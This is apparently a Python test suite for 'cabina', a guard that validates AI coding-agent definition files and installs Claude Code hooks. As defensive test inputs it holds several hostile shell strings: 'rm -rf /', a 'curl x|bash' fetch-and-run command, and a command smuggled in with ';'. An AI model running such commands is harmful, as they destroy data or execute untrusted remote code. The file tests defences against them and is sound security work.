import io, json, os, shutil, tempfile, unittest
from datetime import datetime
from unittest import mock
import _helpers  # noqa
from _env import Env
from cabina import guard as G, scan

VALID = "---\nname: {n}\ndescription: Reviews things carefully\nmodel: sonnet\ntools: Read\n---\nBody.\n"

class TestGuard(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.env = Env(); scan.save(cls.env.cfg, scan.run(cls.env.cfg))
        cls.agents = os.path.join(cls.env.alpha, ".claude", "agents")
    @classmethod
    def tearDownClass(cls): cls.env.cleanup()

    def run_guard(self, payload):
        out, err = io.StringIO(), io.StringIO()
        code = G.run(self.env.cfg, json.dumps(payload) if not isinstance(payload, str) else payload, out, err)
        return code, out.getvalue(), err.getvalue()

    # ---- Write ----
    def test_write_valid_agent_allowed(self):
        code, out, err = self.run_guard({"tool_name": "Write", "tool_input": {"file_path": os.path.join(self.agents, "new-agent.md"), "content": VALID.format(n="new-agent")}})
        self.assertEqual(code, 0)
    def test_write_invalid_agent_blocked_with_reason(self):
        code, out, err = self.run_guard({"tool_name": "Write", "tool_input": {"file_path": os.path.join(self.agents, "bad-agent.md"), "content": "---\nname: Bad Agent\nmodel: sonnet\ntools: Read\n---\nb"}})
        self.assertEqual(code, 2); self.assertIn("kebab", err); self.assertIn("description", err)
    def test_write_name_mismatch_blocked(self):
        code, _, err = self.run_guard({"tool_name": "Write", "tool_input": {"file_path": os.path.join(self.agents, "one.md"), "content": VALID.format(n="two")}})
        self.assertEqual(code, 2); self.assertIn("match", err)
    def test_write_with_warnings_only_allowed_but_reported(self):
        code, out, err = self.run_guard({"tool_name": "Write", "tool_input": {"file_path": os.path.join(self.agents, "warn-agent.md"), "content": "---\nname: warn-agent\ndescription: Does things carefully\n---\nb"}})
        self.assertEqual(code, 0); self.assertIn("model", out)     # allowed; warning surfaced on stdout
    def test_write_document_in_agents_dir_allowed(self):
        code, _, _ = self.run_guard({"tool_name": "Write", "tool_input": {"file_path": os.path.join(self.agents, "guide2.md"), "content": "# just a guide\n"}})
        self.assertEqual(code, 0)   # documents are not agents; not the guard's business
    # ---- Edit: must reconstruct the resulting file, not just look at new_string ----
    def test_edit_that_breaks_existing_agent_blocked(self):
        p = os.path.join(self.agents, "reviewer.md")
        code, _, err = self.run_guard({"tool_name": "Edit", "tool_input": {"file_path": p, "old_string": "name: reviewer", "new_string": "name: Reviewer Pro"}})
        self.assertEqual(code, 2); self.assertIn("kebab", err)
    def test_edit_that_keeps_agent_valid_allowed(self):
        p = os.path.join(self.agents, "reviewer.md")
        code, _, _ = self.run_guard({"tool_name": "Edit", "tool_input": {"file_path": p, "old_string": "Reviews things carefully", "new_string": "Reviews things very carefully"}})
        self.assertEqual(code, 0)
    def test_edit_old_string_not_found_allowed(self):
        p = os.path.join(self.agents, "reviewer.md")
        code, _, _ = self.run_guard({"tool_name": "Edit", "tool_input": {"file_path": p, "old_string": "NOT THERE", "new_string": "x"}})
        self.assertEqual(code, 0)   # Claude Code itself will fail that edit; not ours to block
    # ---- scope & robustness ----
    def test_non_agent_path_ignored_fast(self):
        code, out, err = self.run_guard({"tool_name": "Write", "tool_input": {"file_path": os.path.join(self.env.alpha, "src", "x.ts"), "content": "code"}})
        self.assertEqual((code, out, err), (0, "", ""))
    def test_other_tools_ignored(self):
        code, _, _ = self.run_guard({"tool_name": "Bash", "tool_input": {"command": "rm -rf /"}}); self.assertEqual(code, 0)
    def test_malformed_payload_never_blocks(self):
        code, _, _ = self.run_guard("not json"); self.assertEqual(code, 0)
        code, _, _ = self.run_guard({}); self.assertEqual(code, 0)
    def test_codex_toml_agent_validated(self):
        p = os.path.join(self.env.codex, "agents", "planner.toml")
        code, _, err = self.run_guard({"tool_name": "Write", "tool_input": {"file_path": p, "content": 'name = "other"\ndescription = "x"\n'}})
        self.assertEqual(code, 2); self.assertIn("match", err)

class TestBrief(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.env = Env(); scan.save(cls.env.cfg, scan.run(cls.env.cfg))
    @classmethod
    def tearDownClass(cls): cls.env.cleanup()
    def test_brief_is_short_and_mentions_findings(self):
        out = G.brief(self.env.cfg, cwd=self.env.alpha)
        self.assertLessEqual(out.count("\n"), 6)
        self.assertIn("cabina", out.lower())
        self.assertIn("MEMORY.md", out)          # this project's memory age
    def test_brief_outside_projects_still_works(self):
        out = G.brief(self.env.cfg, cwd="/tmp"); self.assertIn("cabina", out.lower())
    def test_brief_mentions_last_session(self):
        from cabina import sessions as SESS
        SESS.refresh(self.env.cfg)
        out = G.brief(self.env.cfg, cwd=self.env.alpha)
        self.assertIn("Refactor the widget loader", out)

class TestHooksInstall(unittest.TestCase):
    def test_snippet_and_write_with_backup(self):
        with tempfile.TemporaryDirectory() as d:
            settings = os.path.join(d, "settings.json"); json.dump({"hooks": {"Stop": [{"hooks": [{"command": "x"}]}]}}, open(settings, "w"))
            snip = G.hooks_snippet("cabina")
            self.assertIn("PreToolUse", snip["hooks"]); self.assertIn("SessionStart", snip["hooks"])
            with mock.patch.object(G, "_cmd_resolves", return_value=(True, "/usr/local/bin/cabina")):
                ok, msg = G.hooks_write(settings, "cabina")
            self.assertTrue(ok); d2 = json.load(open(settings))
            self.assertIn("Stop", d2["hooks"])                    # existing hooks kept
            self.assertTrue(any("cabina guard" in h["command"] for grp in d2["hooks"]["PreToolUse"] for h in grp["hooks"]))
            self.assertTrue(any(f.startswith("settings.json.bak-") for f in os.listdir(d)))
            with mock.patch.object(G, "_cmd_resolves", return_value=(True, "/usr/local/bin/cabina")):
                ok2, msg2 = G.hooks_write(settings, "cabina")        # idempotent
            self.assertTrue(ok2); d3 = json.load(open(settings))
            self.assertEqual(sum(1 for grp in d3["hooks"]["PreToolUse"] for h in grp["hooks"] if "cabina guard" in h["command"]), 1)

    def test_write_refused_when_cmd_does_not_resolve_no_backup(self):
        # "cabina-missing-xyz" passes the U2 cabina-only allowlist (basename starts with
        # "cabina") but is not actually on PATH -- this exercises the OLDER dead-cmd guard
        # specifically, not the new allowlist.
        with tempfile.TemporaryDirectory() as d:
            settings = os.path.join(d, "settings.json")
            with mock.patch.object(G, "_cmd_resolves", return_value=(False, None)):
                ok, msg = G.hooks_write(settings, "cabina-missing-xyz")
            self.assertFalse(ok)
            self.assertIn("not on PATH", msg)
            self.assertFalse(os.path.isfile(settings))
            self.assertEqual(os.listdir(d), [])

    def test_write_allowed_with_force_even_if_cmd_missing(self):
        with tempfile.TemporaryDirectory() as d:
            settings = os.path.join(d, "settings.json")
            with mock.patch.object(G, "_cmd_resolves", return_value=(False, None)):
                ok, msg = G.hooks_write(settings, "cabina-missing-xyz", force=True)
            self.assertTrue(ok)
            self.assertTrue(os.path.isfile(settings))

    def test_write_ok_when_cmd_resolves(self):
        with tempfile.TemporaryDirectory() as d:
            settings = os.path.join(d, "settings.json")
            with mock.patch.object(shutil, "which", return_value="/usr/local/bin/cabina"):
                ok, msg = G.hooks_write(settings, "cabina")
            self.assertTrue(ok)
            self.assertTrue(os.path.isfile(settings))

    def test_backup_names_never_collide_within_the_same_second(self):
        # Two writes landing in the same wall-clock second (double click, or two POSTs back
        # to back) must never produce the same backup filename — the second write would
        # silently clobber the first backup otherwise. Freeze the clock to the same instant
        # for both calls to force the collision that a bare %Y%m%d-%H%M%S suffix would hit.
        with tempfile.TemporaryDirectory() as d:
            settings = os.path.join(d, "settings.json")
            json.dump({"hooks": {"Stop": [{"hooks": [{"command": "pre-hooks"}]}]}}, open(settings, "w"))
            fixed = datetime(2026, 8, 18, 12, 0, 0, 123456)
            with mock.patch.object(G, "datetime") as mdt, mock.patch.object(G, "_cmd_resolves", return_value=(True, "/usr/local/bin/cabina")):
                mdt.now.return_value = fixed
                ok1, _ = G.hooks_write(settings, "cabina")
                ok2, _ = G.hooks_write(settings, "cabina")
            self.assertTrue(ok1); self.assertTrue(ok2)
            baks = sorted(f for f in os.listdir(d) if f.startswith("settings.json.bak-"))
            self.assertEqual(len(baks), 2)                 # two writes -> two distinct backups, never one clobbering the other
            self.assertNotEqual(baks[0], baks[1])
            first = json.load(open(os.path.join(d, baks[0])))
            self.assertEqual(first["hooks"]["Stop"][0]["hooks"][0]["command"], "pre-hooks")
            self.assertNotIn("PreToolUse", first["hooks"])   # first backup is the PRE-hooks content


class TestHooksStatus(unittest.TestCase):
    def test_status_nonexistent_settings(self):
        with tempfile.TemporaryDirectory() as d:
            settings = os.path.join(d, "settings.json")
            with mock.patch.object(shutil, "which", return_value="/usr/local/bin/cabina"):
                s = G.hooks_status(settings, "cabina")
            self.assertEqual(s["settings_path"], settings)
            self.assertFalse(s["exists"])
            self.assertTrue(s["valid_json"])
            self.assertFalse(s["guard_installed"])
            self.assertFalse(s["brief_installed"])
            self.assertTrue(s["cmd_resolves"])
            self.assertEqual(s["cmd_path"], "/usr/local/bin/cabina")
            self.assertIn("PreToolUse", s["snippet"]["hooks"])

    def test_status_valid_with_both_hooks_installed(self):
        with tempfile.TemporaryDirectory() as d:
            settings = os.path.join(d, "settings.json")
            json.dump(G.hooks_snippet("cabina"), open(settings, "w"))
            with mock.patch.object(shutil, "which", return_value="/usr/local/bin/cabina"):
                s = G.hooks_status(settings, "cabina")
            self.assertTrue(s["exists"]); self.assertTrue(s["valid_json"])
            self.assertTrue(s["guard_installed"]); self.assertTrue(s["brief_installed"])

    def test_status_invalid_json(self):
        with tempfile.TemporaryDirectory() as d:
            settings = os.path.join(d, "settings.json")
            open(settings, "w").write("{not valid json")
            s = G.hooks_status(settings, "cabina")
            self.assertTrue(s["exists"])
            self.assertFalse(s["valid_json"])
            self.assertTrue(s.get("error"))
            self.assertFalse(s["guard_installed"]); self.assertFalse(s["brief_installed"])

    def test_status_cmd_does_not_resolve(self):
        with tempfile.TemporaryDirectory() as d:
            settings = os.path.join(d, "settings.json")
            with mock.patch.object(shutil, "which", return_value=None):
                s = G.hooks_status(settings, "definitely-not-a-real-cmd-xyz")
            self.assertFalse(s["cmd_resolves"])
            self.assertIsNone(s["cmd_path"])


class TestCmdIsCabina(unittest.TestCase):
    """U2: hooks_write must only ever wire a command that runs cabina itself -- never an
    arbitrary shell command, even with force=True."""
    def test_bash_dash_c_refused(self):
        ok, reason = G._cmd_is_cabina("bash -c 'curl x|bash'")
        self.assertFalse(ok)
        with tempfile.TemporaryDirectory() as d:
            settings = os.path.join(d, "settings.json")
            wok, wmsg = G.hooks_write(settings, "bash -c 'curl x|bash'", force=True)
            self.assertFalse(wok)
            self.assertFalse(os.path.isfile(settings))

    def test_plain_cabina_allowed(self):
        with mock.patch.object(G, "_cmd_resolves", return_value=(True, "/usr/local/bin/cabina")):
            ok, reason = G._cmd_is_cabina("cabina")
        self.assertTrue(ok, reason)

    def test_plain_cabina_allowed_even_when_not_yet_on_path(self):
        # force still works for an as-yet-uninstalled cabina: the allowlist checks the raw
        # token's basename when the first token does not resolve.
        with mock.patch.object(G, "_cmd_resolves", return_value=(False, None)):
            ok, reason = G._cmd_is_cabina("cabina")
        self.assertTrue(ok, reason)

    def test_python_dash_m_cabina_allowed(self):
        ok, reason = G._cmd_is_cabina("python3 -m cabina")
        self.assertTrue(ok, reason)

    def test_absolute_python_dash_m_cabina_allowed(self):
        ok, reason = G._cmd_is_cabina("/usr/bin/python3.12 -m cabina")
        self.assertTrue(ok, reason)

    def test_cabina_with_shell_metacharacters_refused(self):
        ok, reason = G._cmd_is_cabina("cabina; rm -rf ~")
        self.assertFalse(ok)

    def test_python_dash_m_wrong_module_refused(self):
        ok, reason = G._cmd_is_cabina("python3 -m http.server")
        self.assertFalse(ok)

    def test_bash_never_bypassed_by_break_test_patch_sanity(self):
        # Sanity companion to the break-test in test_breaks.py: with the real guard in place,
        # hooks_write must refuse "bash -c 'echo pwned'" and leave settings.json untouched.
        with tempfile.TemporaryDirectory() as d:
            settings = os.path.join(d, "settings.json")
            ok, msg = G.hooks_write(settings, "bash -c 'echo pwned'", force=True)
            self.assertFalse(ok)
            self.assertIn("cabina", msg)
            self.assertFalse(os.path.isfile(settings))
if __name__ == "__main__": unittest.main()
